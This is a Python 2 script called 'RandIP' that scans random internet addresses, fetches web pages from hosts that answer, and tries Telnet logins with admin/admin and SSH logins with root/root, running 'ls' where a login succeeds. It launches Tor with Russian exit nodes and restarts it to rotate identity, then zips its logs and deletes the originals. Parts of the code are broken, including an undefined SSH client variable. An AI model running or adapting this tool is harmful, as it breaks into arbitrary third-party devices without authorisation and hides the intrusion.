#RandIP 0.9 beta#
#Random IP Generator with Tor, Socket, SSH, Telnet, and HTML Screenshot support.#
#Report bugs including uncontained exceptions to blmvxer@gmail.com#
import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process
from random import randint
from stem.util import term

SOCKS_PORT = 7000

a = []
b = []
c = []
d = []
e = []
f = []
g = []
hostlog = []
timestr = time.strftime("%Y%m%d-%H%M%S")
def WriteLog():
	print('Keyboard Interrupt Detected.\n')
	fp.write('Hosts Attempted(')
	fp.write(str(a))
	fp.write(')\n')
	fp.write('\n')
	fp.write('Working Hosts(')
	fp.write(str(b))
	fp.write(')\n')
	fp.write('\n')
	fp.write('Working Host Lookup(')
	fp.write(str(c))
	fp.write(')\n')
	fp.write('\n')
	fp.write('Telnet Information(')
	fp.write(str(d))
	fp.write(')\n')
	fp.write('\n')
	fp.write('Failed Telnet Conncections(')
	fp.write(str(e))
	fp.write(')')
	fp.write('\n')
	fp.write('SSH Information(')
	fp.write(str(f))
	fp.write(')')
	fp.write('\n')
	fp.write('Failed SSH(')
	fp.write(str(g))
	fp.write(')')
	fp.close()
	zf = zipfile.ZipFile('randip_log.zip', mode='w')
	try:
		for hostlist in hostlog:
			print('zipping ' + hostlist + ' to randip_log.zip\n')
			zf.write(hostlist)
	except zipfile.BadZipfile:
		print(zipfile.BadZipfile)
		zf.close()
	except OSError:
		print(OSError)
		zf.close()
	zf.write(logfile)
	zf.close()
	s.close()
	print('Cleaning up files...\n')
	time.sleep(3)
	for hostr in hostlog:
		os.remove(hostr)
	os.remove(logfile)
	tor_process.kill()
	print('Directory cleaned!, All sockets closed!, and Tor shutdown!')
		
def Tor_Connect():
	global tor_process
	tor_process = stem.process.launch_tor_with_config(
	config = {
	'SocksPort': str(SOCKS_PORT),
	'ExitNodes': '{ru}',
	},
	init_msg_handler = print_bootstrap_lines,
	)

def print_bootstrap_lines(line):
  if "Bootstrapped " in line:
    print(term.format(line, term.Color.BLUE))

def randip():
	while True:
		yield ".".join(str(randint(1, 255)) for i in range(int(4)))

logfile = str(timestr) + "_randip_log.txt"
fp = open(logfile, 'w')
print("Connecting Tor...\n")
Tor_Connect()
for address in randip():
	try:
		try:
			#Socket tests with a timeout of 1.8 seconds#
			s = socket.socket()
			s.settimeout(1.8)
			s.connect((address, 80))
			print address, "WORKS!!!"
			b.append(address)
			hostbyadr = socket.gethostbyaddr(address)
			print hostbyadr
			c.append(hostbyadr)
			req = requests.get('http://' + address)
			if str(req.status_code) == '200':
				print('Response Code: ' + str(req.status_code) + ' Works')
			elif str(req.status_code) == '400':
				print('Response Code: ' + str(req.status_code) + ' Bad Request')
			elif str(req.status_code) == '401':
				print('Response Code: ' + str(req.status_code) + ' Unauthorized')
			elif str(req.status_code) == '403':
				print('Response Code: ' + str(req.status_code) + ' Forbidden')
			elif str(req.status_code) == '404':
				print('Response Code: ' + str(req.status_code) + ' Not Found')
			else:
				print('Response Code: ' + str(req.status_code))
			fpadr = open('host.' + address, 'w')
			fpadr.write('Response Code: ' + str(req.status_code))
			fpadr.write('\n')
			fpadr.write(req.text.encode('utf-8').strip())
			fpadr.close()
			hostlog.append('host.' + address)
			print('Beginning Telnet attempt on %s\n' % address)
			#Default telnet connection using admin as user and password#
			try:
				tn = telnetlib.Telnet(address, 3)
				tn.read_until("login: ")
				time.sleep(3)#Sometimes telnet takes a second after login#
				tn.write('admin' + '\n')
				tn.read_until('Password: ')
				tn.write('admin' + '\n')
				tn.write("ls\n")
				tn.write("exit\n")
				print tn.read_all()
				d.append(tn.read_all())
				tor_process.kill()
				Tor_Connect()
			except socket.error:
				print(socket.error, 'Error Signing in or Telnet not accessible', address)
				print '\n'
				e.append(address)
				tor_process.kill()
				Tor_Connect()
				pass
			except EOFError:
				print(EOFError, address)
				d.append(address)
				tor_process.kill()
				Tor_Connect()
				pass
			except KeyboardInterrupt:
				WriteLog()
				tor_process.kill()
				break
			try:
				print('Starting SSH Attempt on %s' % address)
				SSH = paramiko.SSHClient()
				SSH.connect(address, username='root', password='root')
				stdin, stdout, stderr = client.exec_command('ls')
				for line in stdout:
					print '... ' + line.strip('\n')
				client.close()
				f.append(address)
			except socket.timeout:
				print(socket.timeout, '%s timeout SSH or SSH not accessible' % address)
				g.append(address)
				tor_process.kill()
				Tor_Connect()
				pass
			except socket.error:
				print(socket.timeout, '%s timeout SSH or SSH not accessible' % address)
				tor_process.kill()
				g.append(address)
				Tor_Connect()
				pass
			except paramiko.ssh_exception.SSHException:
				print(paramiko.ssh_exception.SSHException, 'SSH Could not connect or SSH not accessible', address)
				g.append(address)
				tor_process.kill()
				Tor_Connect()
				pass
			except paramiko.ssh_exception.AuthenticationException:
				print(paramiko.ssh_exception.AuthenticationException, 'Error logging into SSH' ,  address)
				g.append(address)
				tor_process.kill()
				Tor_Connect()
				pass
			except KeyboardInterrupt:
				WriteLog()
				tor_process.kill()
				break
		except socket.timeout:
			print(socket.timeout, '%s timeout' % address)
			print '\n'
			a.append(address)
			pass
		except socket.herror:
			print(socket.herror, 'Error getting host by address on %s' % address)
			print '\n'
			a.append(address)
			pass
		except socket.error:
			print(socket.error, 'Failed to connect to %s' % address)
			print '\n'
			a.append(address)
			pass
		except requests.exceptions.HTTPError:
			print(requests.exceptions.HTTPError, address)
			a.append(address)
			tor_process.kill()
			Tor_Connect()
			pass
		except requests.exceptions.ConnectionError:
			print(requests.exceptions.ConnectionError, address)
			a.append(address)
			tor_process.kill()
			Tor_Connect()
			pass
		except TypeError:
			print(TypeError, address)
			a.append(address)
			tor_process.kill()
			Tor_Connect()
			pass
	except KeyboardInterrupt:
		WriteLog()
		tor_process.kill()
		break
